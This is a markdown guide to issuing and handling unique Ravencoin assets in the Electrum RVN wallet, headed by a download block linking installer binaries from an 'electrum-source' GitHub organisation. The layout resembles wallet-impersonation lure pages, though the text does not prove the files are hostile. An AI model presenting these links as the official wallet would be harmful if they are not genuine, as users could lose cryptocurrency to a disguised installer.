![Electrum RVN](assets/banner-article.png)

# Unique Ravencoin Assets in Electrum RVN

<!-- compact-download-block -->

<p align="center">One unit, issued once, with no supply to add</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
A unique asset is issued as exactly one indivisible unit, and it cannot be reissued. That is not a limitation; it is the design. It makes a unique asset the right shape for a certificate, a collectible, a deed or a ticket - anything where "there is one" is the point.

## What "unique" changes

| Property | Named asset | Unique asset |
| --- | --- | --- |
| Supply | a quantity you choose | exactly one |
| Divisible | usually yes | no - a single whole unit |
| Reissuable | your choice at issuance | no reissue offered |
| Can be burned | yes | yes |
| Good for | tokens, editions, shares | certificates, items, proofs |

The combination of one unit and no reissue path is what makes scarcity checkable: anyone looking at the name sees a single unit and no route to more.

## Issuing one

1. **Fund the wallet** with enough RVN for the chain-level charge and the fee.
2. **Choose create asset** and set the type to unique rather than a divisible supply.
3. **Enter the name.** It is permanent, and it is global - check it before you commit.
4. **Confirm the summary** and broadcast.
5. **Wait for confirmations**, then check the asset appears in the wallet list.

There is no quantity to choose for a unique asset: one unit is the definition, so the screen has nothing to fill in beyond the name.

## What a unique asset is good for

**Certificates.** A proof of completion, membership or authenticity that exists once and can be verified by anyone.

**Collectibles.** One item, one holder, transferable like any asset.

**Deeds and receipts.** A record that something specific exists, with the chain as the timestamp.

**Ticketing.** A single seat, a single pass - though anyone running a real event needs a plan for what happens when a holder loses the key.

## What it is not good for

**Anything you might need more of.** There is no reissue, ever. If a second unit might be needed, a named asset with a fixed quantity is the right tool.

**Fractional ownership.** Unique assets are indivisible, so a share of one is not representable on-chain with this instrument.

**Anything requiring an update to its metadata.** The asset carries a name and a quantity; changing what it means is a documentation problem, not a chain operation.

## Verification, which is the real value

The point of a unique asset is that a third party can check it without trusting you. They look at the name, see a single unit, and see that issuance cannot be repeated.

That check is only as good as the name's clarity. A unique asset called `CERT1234` tells a verifier nothing unless your documentation says what it certifies and who issued it. The chain supplies scarcity; you supply meaning - and the two have to match.

## Handling one carefully

A unique asset is one key away from being gone. If it is held at an address derived from a seed you did not back up, a disk failure destroys something that cannot be reissued.

So: write the seed down before you issue, test the restore once, and consider holding the asset on a device or in a setup where a stolen laptop is not the end. [Watch-only wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md) is the monitoring half; a cold-storage workflow is the holding half.

And if you transfer it, send it to a wallet that understands native Ravencoin assets. A wallet that only knows RVN will show an empty balance and your buyer will believe they were cheated - [transferring Ravencoin assets with Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/transferring-ravencoin-assets-with-electrum-rvn.md).

## Unique versus sub-asset

A sub-asset is a child under a parent namespace, and it can have a quantity. A unique asset is a single item that stands alone.

If you are issuing a series of one-of-a-kind items under one brand, the usual shape is a parent with unique children, so the family is visible in the name and each item is provably single - [creating Ravencoin sub-assets](https://github.com/electrum-source/token-and-network/blob/main/creating-ravencoin-sub-assets-in-electrum-rvn.md).

If you are issuing one certificate with no family, a unique asset on its own is simpler.

## What happens if it is lost

There is no reissue, so the loss is permanent - and that is the property that gives the asset its meaning. A certificate that could be reissued on request would not be scarce.

Burn is the one deliberate exception: a holder can destroy a unique asset on purpose, which is a way of retiring a certificate rather than losing it - [burning and reissuing assets](https://github.com/electrum-source/token-and-network/blob/main/burning-and-reissuing-assets-with-electrum-rvn.md).

## Costs and confirmations

Issuing costs a chain-level charge plus the network fee, in RVN; the wallet shows the amount before you confirm, and [Ravencoin asset issuance cost](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-asset-issuance-cost-in-electrum-rvn.md) is about that charge. The asset needs confirmations before it appears, and a rescan or server switch can be needed - [issued asset missing from Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issued-asset-missing-from-electrum-rvn.md).

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. [What is a Ravencoin asset?](https://github.com/electrum-source/token-and-network/blob/main/what-is-a-ravencoin-asset-in-electrum-rvn.md) is the overview of the whole asset layer, and [how to issue a Ravencoin asset in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issue-a-ravencoin-asset-in-electrum-rvn.md) is the general procedure this page narrows.

## FAQ

### Can I issue more than one unit of a unique asset?

No. A unique asset is exactly one indivisible unit, and it cannot be reissued - that is its definition.

### Can a unique asset be transferred?

Yes, like any asset, to an address in a wallet that understands native Ravencoin assets.

### Can I burn a unique asset?

Yes. Burning destroys it permanently, which is a deliberate retirement rather than a loss.

### Is a unique asset an NFT?

It is a single indivisible on-chain asset with a permanent name, which is the same idea implemented natively rather than through a contract on another chain.

### What if I lose the key?

The asset is gone; there is no reissue. That is why the seed is written down and tested before anything is issued.

<!-- related-articles -->

## Related articles

- [Watch-Only Wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md)
- [Transferring Ravencoin Assets With Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/transferring-ravencoin-assets-with-electrum-rvn.md)
- [Creating Ravencoin Sub-Assets in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/creating-ravencoin-sub-assets-in-electrum-rvn.md)
- [Burning and Reissuing Assets With Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/burning-and-reissuing-assets-with-electrum-rvn.md)
